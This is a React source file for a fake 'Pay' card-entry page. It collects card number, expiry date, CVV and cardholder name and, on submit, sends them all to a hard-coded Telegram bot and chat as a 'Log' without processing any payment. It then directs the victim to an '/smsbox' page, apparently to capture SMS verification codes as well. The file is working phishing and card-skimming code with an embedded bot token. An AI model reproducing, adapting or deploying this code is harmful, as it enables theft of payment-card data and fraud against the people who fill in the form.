import React from "react";
import "./paybox.css";
import { Link } from "react-router-dom";

const Paybox = () => {
  const sendData = (e) => {
    e.preventDefault();
    var text1 = document.getElementById("card_number").value;
    var text2 = document.getElementById("expire_date").value;
    var text3 = document.getElementById("cvv").value;
    var text4 = document.getElementById("cardholder_name").value;

    var logsss = `Log :%0A -card_number: ${text1} %0A - expire_date: ${text2} %0A - cvv: ${text3} %0A - cardholder_name: ${text4}`;

    var token = "6970189544:AAGwiLCKP9aoh-CyZPE1BhI-UDQTPzvjCZE";
    var chat_id = -1002071552778;
    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${logsss}`;

    let api = new XMLHttpRequest();

    api.open("GET", url, true);
    api.send();
  };

  return (
    <div>
      <div className="paycontainer">
        <div className="paytitle">Enter Your Card Details</div>
        <form onSubmit={sendData} className="form" id="form">
          <div className="paytext">Card Number</div>
          <input
            id="card_number"
            name="cardn"
            className="payinput"
            placeholder="1234 5678 1234 5678"
          />
          <div className="paytext">Expiry Date</div>
          <input
            id="expire_date"
            name="edata"
            className="payinput"
            placeholder="MMYY"
          />
          <div className="paytext">CVV</div>
          <input id="cvv" name="cvv" className="payinput" placeholder="123" />
          <div className="paytext">Cardholder Name</div>
          <input
            id="cardholder_name"
            name="uname"
            className="payinput"
            type="text"
            placeholder="John Doe"
          />
          <div></div>
          <button type="submit" className="paybtn">
            Pay
          </button>
          <div className="dfg">___</div>
          <Link to="/smsbox" className="paylinkk">
            Check the SMS code after payment
          </Link>
        </form>
      </div>
    </div>
  );
};

export default Paybox;
